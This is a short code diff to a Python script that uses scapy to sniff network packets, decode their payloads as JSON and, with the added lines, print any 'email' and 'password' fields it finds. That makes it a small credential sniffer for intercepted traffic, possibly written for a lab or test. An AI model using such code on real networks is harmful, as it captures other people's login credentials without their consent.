@@ -1,7 +1,7 @@
 import unittest # Used to execute the unit tests
 import requests # Used for HTTP & API Calls
 from scapy.all import *
-
+import json
 
 def packet_handler(packet):
     if packet.haslayer(Raw):
@@ -12,6 +12,8 @@ def packet_handler(packet):
         json_data = None
         try:
             json_data = json.loads(packet[Raw].load.decode())
+            print(json_data['email'])
+            print(json_data['password'])
         except:
             pass
         
